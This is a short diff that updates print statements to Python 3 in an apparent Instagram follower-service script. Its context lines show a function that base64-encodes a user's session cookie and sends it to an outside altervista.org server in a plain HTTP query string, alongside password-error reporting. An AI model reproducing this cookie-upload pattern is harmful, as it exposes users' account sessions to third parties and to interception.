@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-
-
 import base64
 import requests
 import json
@@ -183,8 +181,8 @@ def updatePasswordErrataAndProcessing(username,passwordErrata):
 
 def updateProcessing(username,value):
     url = "http://getfollowersoninstagram.altervista.org/updateProcessing.php?username=" + username + "&processing=" + str(value)
-    print url
-    print requests.get(url).content
+    print(url)
+    print(requests.get(url).content)
 
 def updateSctiptActive(username,valore):
     url = "http://getfollowersoninstagram.altervista.org/updateScriptActive.php?username=" + username + "&script_active=" + str(valore)
@@ -212,7 +210,7 @@ def saveIdIntoDatabase(username,id):
 def seveCookieIntoServer(username,cookie):
     cookie =  base64.b64encode(str(cookie))
     url = "http://getfollowersoninstagram.altervista.org/saveCookie.php?username=" + str(username) +"&cookie="+str(cookie)
-    print requests.get(url).content
+    print(requests.get(url).content)
 
 
 
